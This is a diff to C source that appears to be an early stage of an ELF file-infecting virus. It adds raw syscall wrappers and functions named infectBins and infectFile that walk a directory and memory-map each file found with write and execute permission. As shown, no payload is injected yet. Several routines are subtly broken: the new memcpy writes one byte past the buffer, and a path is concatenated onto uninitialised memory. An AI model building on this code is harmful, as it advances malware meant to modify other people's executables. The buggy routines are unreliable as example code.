@@ -6,6 +6,7 @@
 #include <stdio.h>
 #include <signal.h>
 #include <dirent.h>
+#include <elf.h>
 
 #define BUF_SIZE 1024
 
@@ -51,9 +52,9 @@ static int  close(int fd) {
   return (rax);
 }
 
-static int  fstat(int fd, struct stat *statbuf) {
-  register int8_t       rax asm("rax") = 5;
-  register unsigned int rdi asm("rdi") = fd;
+static int  stat(const char *filename, struct stat *statbuf) {
+  register int8_t       rax asm("rax") = 4;
+  register const char   *rdi asm("rdi") = filename;
   register struct stat  *rsi asm("rsi") = statbuf;
 
   asm("syscall"
@@ -62,6 +63,7 @@ static int  fstat(int fd, struct stat *statbuf) {
 }
 
 static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off) {
+  register void         *ret asm("rax");
   register int8_t       rax asm("rax") = 9;
   register void   *rdi asm("rdi") = addr;
   register size_t rsi asm("rsi") = len;
@@ -71,8 +73,8 @@ static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t
   register off_t  r9 asm("r9") = off;
 
   asm("syscall"
-    : "=r" (rax));
-  return (NULL + rax);
+    : "=r" (ret));
+  return (ret);
 }
 
 static int  munmap(void *addr, size_t len) {
@@ -97,13 +99,11 @@ static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int co
 }
 
 static void *memcpy(void *dest, const void *src, size_t n) {
-  char  *result;
-
-  result = dest;
-  while (n-- > 0) {
-    result[n] = ((char *)src)[n];
+  while (n > 0) {
+    ((char *)dest)[n] = ((char *)src)[n];
     n -= 1;
   }
+  ((char *)dest)[0] = ((char *)src)[0];
   return (dest);
 }
 
@@ -174,25 +174,64 @@ static void  *memmove(void *dest, const void *src, size_t n) {
 
 /* } */
 
+#include <sys/mman.h>
+#include <errno.h>
+#include <string.h>
+
+static int  infectFile(const char *dirname, const char *filename) {
+  int         fd;
+  size_t      len;
+  char        *tmp;
+  char        slash[] = "/";
+  struct stat stats;
+  Elf64_Ehdr  *target;
+
+  len = strlen(dirname) + strlen(filename) + 2;
+  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+    return (-1);
+  memcpy(tmp, dirname, strlen(dirname));
+  strcat(tmp, slash);
+  strcat(tmp, filename);
+  if ((fd = open(tmp, O_RDONLY)) <= 0) {
+    munmap(tmp, len);
+    return (-1);
+  }
+  if (stat(tmp, &stats) < 0) {
+    close(fd);
+    munmap(tmp, len);
+    return (-1);
+  }
+  if ((target = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
+    close(fd);
+    munmap(tmp, len);
+    return (-1);
+  }
+  close(fd);
+  munmap(tmp, len);
+  munmap(target, stats.st_size);
+  dprintf(1, "Success\n");
+}
+
 static int  infectBins(const char *dirname) {
   int                   bpos;
   int                   nread;
   int                   fd;
   struct linux_dirent   *dirp;
-  char                  yo[BUF_SIZE];
+  char                  buf[BUF_SIZE];
   char                  d_type;
 
   if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
     return (-1);
-  if ((nread = getdents(fd, (struct linux_dirent *)yo, BUF_SIZE)) < 0)
-    return (1);
+  if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
+    return (-1);
   bpos = 0;
   while (bpos < nread) {
-    dirp = (struct linux_dirent *) (yo + bpos);
-    dprintf(1, "Filename: %s\n", dirp->d_name);
+    dirp = (struct linux_dirent *) (buf + bpos);
+    if (infectFile(dirname, dirp->d_name) == -1)
+      return (-1);
     bpos += dirp->d_reclen;
   }
-  dprintf(1, "Close: %i\n", close(fd));
+  close(fd);
   return (0);
 }
 
